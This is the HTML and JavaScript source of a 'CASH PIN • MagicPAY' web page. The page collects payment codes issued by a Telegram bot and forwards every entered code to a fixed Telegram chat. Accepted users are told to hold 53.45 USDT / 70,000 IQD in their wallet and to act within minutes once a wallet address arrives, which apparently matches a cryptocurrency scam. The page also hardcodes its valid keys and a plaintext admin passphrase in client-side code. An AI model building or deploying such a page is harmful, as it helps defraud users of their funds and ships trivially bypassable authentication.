<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CASH PIN • MagicPAY</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/jpeg" href="https://raw.githubusercontent.com/Asiacell-Erthlink/CASH_PIN/refs/heads/main/CashPin.jpg">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: #0a0a0a; color: #fff; min-height: 100vh; display: flex; flex-direction: column; }
        .app-header { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; background: #0f0f0f; border-bottom: 1px solid #222; position: sticky; top: 0; z-index: 100; }
        .menu-btn { background: none; border: none; color: white; font-size: 24px; cursor: pointer; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; border-radius: 50%; background: #1a1a1a; }
        .header-logo { display: flex; align-items: center; gap: 8px; }
        .header-logo img { width: 36px; height: 36px; border-radius: 50%; object-fit: cover; box-shadow: 0 0 15px rgba(255,255,255,0.3); border: 2px solid rgba(255,255,255,0.5); }
        .header-logo span { font-weight: 700; font-size: 18px; color: #eee; }
        .header-placeholder { width: 40px; }
        .sidebar-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(4px); z-index: 200; display: none; opacity: 0; transition: opacity 0.3s; }
        .sidebar { position: fixed; top: 0; left: -280px; width: 260px; height: 100%; background: #111; border-right: 1px solid #2a2a2a; z-index: 250; transition: left 0.3s ease; padding: 24px 16px; overflow-y: auto; box-shadow: 2px 0 20px rgba(0,0,0,0.7); }
        .sidebar.open { left: 0; }
        .sidebar-overlay.open { display: block; opacity: 1; }
        .sidebar-logo { display: flex; justify-content: center; margin-bottom: 32px; }
        .sidebar-logo img { width: 80px; height: 80px; border-radius: 50%; border: 3px solid white; box-shadow: 0 0 25px rgba(255,255,255,0.4); }
        .pending-title { display: flex; align-items: center; gap: 8px; font-weight: 600; margin: 24px 0 16px; color: #aaa; text-transform: uppercase; font-size: 13px; letter-spacing: 0.5px; }
        .pending-list { list-style: none; display: flex; flex-direction: column; gap: 12px; max-height: 60vh; overflow-y: auto; }
        .pending-item { background: #1a1a1a; border: 1px solid #2a2a2a; border-radius: 16px; padding: 14px; }
        .pending-code { font-family: monospace; font-size: 12px; color: #ccc; word-break: break-all; margin-bottom: 8px; }
        .pending-status { display: flex; align-items: center; justify-content: space-between; }
        .status-badge { padding: 4px 8px; border-radius: 30px; background: #2a2a2a; font-weight: 500; font-size: 11px; }
        .status-badge.processing { background: #ffaa00; color: #000; }
        .status-badge.success { background: #00cc88; color: #000; }
        .status-badge.failed { background: #ff4d4d; color: #fff; }
        .timer { color: #ffaa00; font-weight: 600; font-size: 12px; }
        .new-op-btn-sidebar { width: 100%; background: #2a2a2a; border: none; border-radius: 40px; padding: 14px; color: white; font-weight: 600; margin-top: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .main-content { flex: 1; padding: 16px; background: #0a0a0a; }
        .payment-dialog { max-width: 500px; margin: 0 auto; width: 100%; }
        .dialog-title { font-size: 24px; font-weight: 700; margin-bottom: 8px; background: linear-gradient(135deg, #fff, #aaa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .dialog-sub { color: #888; margin-bottom: 24px; font-size: 14px; }
        .input-group { display: flex; flex-direction: column; gap: 12px; margin-bottom: 24px; }
        .code-input { background: #1a1a1a; border: 1px solid #333; border-radius: 40px; padding: 16px 20px; font-size: 15px; color: white; outline: none; width: 100%; }
        .code-input:focus { border-color: #fff; box-shadow: 0 0 0 2px rgba(255,255,255,0.1); }
        .send-btn { background: white; color: black; border: none; border-radius: 40px; padding: 16px; font-weight: 700; font-size: 16px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; }
        .message-area { background: #111; border-radius: 24px; padding: 20px; border-left: 4px solid #fff; margin-top: 16px; }
        .message-text { line-height: 1.6; color: #ddd; font-size: 15px; }
        .countdown-timer { background: #00000040; border-radius: 40px; padding: 12px 16px; display: inline-flex; align-items: center; gap: 8px; border: 1px solid #ffaa0040; margin-top: 16px; font-weight: 600; width: 100%; justify-content: center; }
        .warning-note { color: #ffaa00; font-size: 13px; margin-top: 16px; background: #ffaa0010; padding: 12px; border-radius: 16px; }
        .telegram-status { font-size: 12px; margin-top: 8px; color: #888; text-align: center; }
        .admin-panel { display: none; }
        .admin-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 10px; }
        .admin-title { font-size: 22px; font-weight: 700; }
        .back-to-user { background: #2a2a2a; border: none; color: white; padding: 10px 16px; border-radius: 40px; cursor: pointer; font-size: 14px; }
        .admin-stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 10px; margin-bottom: 20px; }
        .stat-card { background: #1a1a1a; border-radius: 16px; padding: 16px; border: 1px solid #2a2a2a; }
        .requests-table { background: #1a1a1a; border-radius: 20px; padding: 16px; overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th { text-align: left; padding: 12px 4px; color: #aaa; font-weight: 500; border-bottom: 1px solid #333; }
        td { padding: 12px 4px; border-bottom: 1px solid #222; }
        .action-btn { background: #333; border: none; color: white; padding: 4px 8px; border-radius: 30px; font-size: 11px; cursor: pointer; margin: 2px; }
        .action-btn.success { background: #00aa66; }
        .action-btn.danger { background: #aa3333; }
    </style>
</head>
<body>
    <header class="app-header">
        <button class="menu-btn" id="menuToggle"><i class="fas fa-bars"></i></button>
        <div class="header-logo">
            <img src="https://raw.githubusercontent.com/Asiacell-Erthlink/CASH_PIN/refs/heads/main/CashPin.jpg" alt="CASH PIN">
            <span>CASH PIN</span>
        </div>
        <div class="header-placeholder"></div>
    </header>

    <div class="sidebar-overlay" id="sidebarOverlay"></div>
    <aside class="sidebar" id="sidebar">
        <div class="sidebar-logo">
            <img src="https://raw.githubusercontent.com/Asiacell-Erthlink/CASH_PIN/refs/heads/main/CashPin.jpg" alt="CASH PIN">
        </div>
        <div class="pending-title">
            <i class="fas fa-clock" style="color: #ffaa00;"></i> PROCESSING
        </div>
        <ul class="pending-list" id="pendingList"></ul>
        <button class="new-op-btn-sidebar" id="newOperationSidebarBtn">
            <i class="fas fa-plus-circle"></i> New Operation
        </button>
    </aside>

    <main class="main-content" id="userMode">
        <div class="payment-dialog">
            <h1 class="dialog-title">Paste Your 
            Payment Code Here:</h1>
            <div class="dialog-sub">Enter the key from @CASH_PIN_bot</div>

            <div class="input-group">
                <input type="text" class="code-input" id="paymentCodeInput" placeholder="e.g. JcNCFcc7p29L*****:119***0" autocomplete="off">
                <button class="send-btn" id="sendCodeBtn"><i class="fas fa-paper-plane"></i> Send</button>
            </div>

            <div class="message-area" id="messageArea">
                <div class="message-text" id="messageText">Awaiting your payment code...</div>
                <div id="extraDetails"></div>
                <div id="telegramStatus" class="telegram-status"></div>
            </div>
        </div>
    </main>

    <main class="main-content admin-panel" id="adminMode">
        <div class="admin-header">
            <h1 class="admin-title"><i class="fas fa-crown" style="color: gold;"></i> Admin</h1>
            <button class="back-to-user" id="backToUserBtn"><i class="fas fa-arrow-left"></i> User Mode</button>
        </div>
        <div class="admin-stats" id="adminStats"></div>
        <div class="requests-table">
             <table>
                <thead>
                    <tr><th>Code</th><th>Status</th><th>Created</th><th>Actions</th></tr>
                </thead>
                <tbody id="adminTableBody"></tbody>
             </table>
        </div>
    </main>

    <script>
        (function() {
// ========== CONFIG ==========
const API_URL = '/.netlify/functions/sendTelegram';

            // #Key's_Here🔑
            const VALID_KEYS = [
                "JcNCFcc7p29L768jO:SysKey11980",
                "AbCdEfGhIjKlMnOpQrSt:SampleKey12345",
                "XyZ1234567890abcdef:AnotherKey999"
            ];

            // ========== DATA ==========
            let requests = [];

            function loadRequests() {
                const stored = localStorage.getItem('cashpin_requests');
                if (stored) {
                    try { requests = JSON.parse(stored); } catch(e) { requests = []; }
                } else {
                    requests = [];
                }
            }
            function saveRequests() {
                localStorage.setItem('cashpin_requests', JSON.stringify(requests));
                updatePendingList();
                if (isAdminActive) updateAdminTable();
            }

            function generateId() { return Date.now() + '-' + Math.random().toString(36).substr(2,9); }

            // ========== UI ELEMENTS ==========
            const menuToggle = document.getElementById('menuToggle');
            const sidebar = document.getElementById('sidebar');
            const sidebarOverlay = document.getElementById('sidebarOverlay');
            const pendingListEl = document.getElementById('pendingList');
            const paymentInput = document.getElementById('paymentCodeInput');
            const sendBtn = document.getElementById('sendCodeBtn');
            const messageText = document.getElementById('messageText');
            const extraDetails = document.getElementById('extraDetails');
            const telegramStatus = document.getElementById('telegramStatus');
            const newOpSidebarBtn = document.getElementById('newOperationSidebarBtn');
            const userMode = document.getElementById('userMode');
            const adminMode = document.getElementById('adminMode');
            const backToUserBtn = document.getElementById('backToUserBtn');
            const adminTableBody = document.getElementById('adminTableBody');
            const adminStats = document.getElementById('adminStats');

            let isAdminActive = false;
            let activeTimers = {};

            // ========== SIDEBAR CONTROLS ==========
            function openSidebar() {
                sidebar.classList.add('open');
                sidebarOverlay.classList.add('open');
            }
            function closeSidebar() {
                sidebar.classList.remove('open');
                sidebarOverlay.classList.remove('open');
            }
            menuToggle.addEventListener('click', openSidebar);
            sidebarOverlay.addEventListener('click', closeSidebar);

            // ========== PENDING LIST RENDER ==========
            function updatePendingList() {
                if (!pendingListEl) return;
                const pendingRequests = requests.filter(r => r.status === 'processing');
                if (pendingRequests.length === 0) {
                    pendingListEl.innerHTML = '<li style="color:#555; text-align:center; padding:20px;">No active operations</li>';
                    return;
                }
                let html = '';
                pendingRequests.forEach(req => {
                    const expiresAt = new Date(req.expiresAt).getTime();
                    const now = Date.now();
                    const diff = expiresAt - now;
                    const hours = Math.floor(diff / (1000*60*60));
                    const minutes = Math.floor((diff % (1000*60*60)) / (1000*60));
                    const timeStr = diff > 0 ? `${hours}h ${minutes}m` : 'Expired';
                    html += `<li class="pending-item">
                        <div class="pending-code">${req.code.substring(0,25)}...</div>
                        <div class="pending-status">
                            <span class="status-badge processing">${req.status}</span>
                            <span class="timer"><i class="far fa-hourglass"></i> ${timeStr}</span>
                        </div>
                    </li>`;
                });
                pendingListEl.innerHTML = html;
            }

            // ========== TELEGRAM SENDER VIA VERCEL API ==========
            async function sendTelegramMessage(text) {
                const payload = {
                    chat_id: '5828320239', // Tele-🆔-Here
                    text: text,
                    parse_mode: 'Markdown'
                };

                try {
                    const response = await fetch(API_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    const data = await response.json();
                    if (!data.ok) throw new Error(data.description);
                    console.log('Telegram message sent via Vercel');
                    telegramStatus.innerText = '✅ Telegram notification sent';
                    setTimeout(() => { telegramStatus.innerText = ''; }, 3000);
                } catch (error) {
                    console.error('API error:', error);
                    telegramStatus.innerText = '❌ Failed to send Telegram notification';
                }
            }

            // ========== PROCESS CODE ==========
            function processPaymentCode(code) {
                const trimmedCode = code.trim();
                const now = new Date();
                const timeString = now.toLocaleString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false });

                // Admin code
                if (trimmedCode === 'Admin:JL:Site') {
                    enterAdminMode();
                    closeSidebar();
                    return;
                }

                // Check if valid
                if (!VALID_KEYS.includes(trimmedCode)) {
                    messageText.innerText = '❌ Invalid or used key. Please obtain a valid key.';
                    extraDetails.innerHTML = '';

                    const failMsg = `❌ *Invalid Payment Code Attempt*\n\nCode: \`${trimmedCode}\`\nTime: ${timeString}\nStatus: Failed (invalid/used)`;
                    sendTelegramMessage(failMsg);
                    return;
                }

                // Check if already used
                if (requests.some(r => r.code === trimmedCode)) {
                    messageText.innerText = '⚠️ This key has already been used.';
                    extraDetails.innerHTML = '';

                    const usedMsg = `⚠️ *Reused Key Attempt*\n\nCode: \`${trimmedCode}\`\nTime: ${timeString}\nStatus: Already used`;
                    sendTelegramMessage(usedMsg);
                    return;
                }

                // Success: create new request
                const expiresAt = Date.now() + (6 * 60 * 60 * 1000);
                const newReq = {
                    id: generateId(),
                    code: trimmedCode,
                    status: 'processing',
                    createdAt: Date.now(),
                    expiresAt: expiresAt,
                };
                requests.push(newReq);
                saveRequests();

                // Update UI
                messageText.innerText = '✅ Payment code accepted!';
                extraDetails.innerHTML = `
                    <div class="countdown-timer" id="countdownDisplay">
                        <i class="fas fa-hourglass-half"></i> <span id="countdownValue">06:00:00</span> remaining
                    </div>
                    <div class="warning-note">
                        ⚡ Keep <strong>53.45 USDT / 70,000 IQD</strong> in your wallet.<br>
                        ⏳ 3 minutes to respond after receiving wallet.<br>
                        📤 MagicPAY wallet will be sent soon.
                    </div>
                `;

                startRequestTimer(newReq.id);
                paymentInput.value = '';
                closeSidebar();

                // Send success message
                const successMsg = `✅ *Payment Code Accepted*\n\n` +
                    `Code: \`${trimmedCode}\`\n` +
                    `Time: ${timeString}\n` +
                    `Expires: ${new Date(expiresAt).toLocaleString()}\n` +
                    `Status: Processing\n` +
                    `User advised to keep 53.45USDT = 70,000IQD.`;
                sendTelegramMessage(successMsg);
            }

            function startRequestTimer(requestId) {
                const req = requests.find(r => r.id === requestId);
                if (!req) return;

                const updateTimer = () => {
                    const now = Date.now();
                    const totalSec = Math.max(0, Math.floor((req.expiresAt - now) / 1000));
                    if (totalSec <= 0) {
                        req.status = 'failed';
                        saveRequests();
                        if (activeTimers[requestId]) clearInterval(activeTimers[requestId]);
                        delete activeTimers[requestId];
                        if (document.getElementById('countdownValue')) {
                            document.getElementById('countdownValue').innerText = 'Expired';
                        }
                        return;
                    }
                    const hours = String(Math.floor(totalSec / 3600)).padStart(2,'0');
                    const mins = String(Math.floor((totalSec % 3600) / 60)).padStart(2,'0');
                    const secs = String(totalSec % 60).padStart(2,'0');
                    const countdownEl = document.getElementById('countdownValue');
                    if (countdownEl) countdownEl.innerText = `${hours}:${mins}:${secs}`;
                };
                if (activeTimers[requestId]) clearInterval(activeTimers[requestId]);
                activeTimers[requestId] = setInterval(updateTimer, 1000);
                updateTimer();
            }

            // ========== ADMIN MODE ==========
            function enterAdminMode() {
                isAdminActive = true;
                userMode.style.display = 'none';
                adminMode.style.display = 'block';
                updateAdminTable();
            }

            function exitAdminMode() {
                isAdminActive = false;
                userMode.style.display = 'block';
                adminMode.style.display = 'none';
            }

            function renderAdminStats() {
                const total = requests.length;
                const processing = requests.filter(r => r.status === 'processing').length;
                const success = requests.filter(r => r.status === 'success').length;
                const failed = requests.filter(r => r.status === 'failed').length;
                adminStats.innerHTML = `
                    <div class="stat-card">Total: ${total}</div>
                    <div class="stat-card">Processing: ${processing}</div>
                    <div class="stat-card">Success: ${success}</div>
                    <div class="stat-card">Failed: ${failed}</div>
                `;
            }

            function updateAdminTable() {
                let rows = '';
                requests.forEach(req => {
                    const created = new Date(req.createdAt).toLocaleTimeString();
                    rows += `
                        <tr>
                            <td><code>${req.code.substring(0,20)}...</code></td>
                            <td><span class="status-badge ${req.status}">${req.status}</span></td>
                            <td>${created}</td>
                            <td>
                                <button class="action-btn success" onclick="window.markSuccess('${req.id}')">✓</button>
                                <button class="action-btn" onclick="window.markProcessing('${req.id}')">↻</button>
                                <button class="action-btn danger" onclick="window.deleteRequest('${req.id}')">✗</button>
                            </td>
                        </tr>
                    `;
                });
                adminTableBody.innerHTML = rows || '<tr><td colspan="4" style="text-align:center;">No requests</td></tr>';
                renderAdminStats();
            }

            window.markSuccess = function(id) {
                const req = requests.find(r => r.id === id);
                if (req) { req.status = 'success'; saveRequests(); updateAdminTable(); }
            };
            window.markProcessing = function(id) {
                const req = requests.find(r => r.id === id);
                if (req) { req.status = 'processing'; saveRequests(); updateAdminTable(); }
            };
            window.deleteRequest = function(id) {
                requests = requests.filter(r => r.id !== id);
                saveRequests();
                updateAdminTable();
                if (activeTimers[id]) clearInterval(activeTimers[id]);
            };

            // ========== EVENT LISTENERS ==========
            sendBtn.addEventListener('click', () => {
                const code = paymentInput.value.trim();
                if (code) processPaymentCode(code);
            });

            paymentInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') sendBtn.click();
            });

            newOpSidebarBtn.addEventListener('click', () => {
                paymentInput.value = '';
                messageText.innerText = 'Awaiting your payment code...';
                extraDetails.innerHTML = '';
                closeSidebar();
                if (isAdminActive) exitAdminMode();
            });

            backToUserBtn.addEventListener('click', exitAdminMode);

            // ========== INIT ==========
            loadRequests();
            updatePendingList();
        })();
    </script>
</body>
</html>
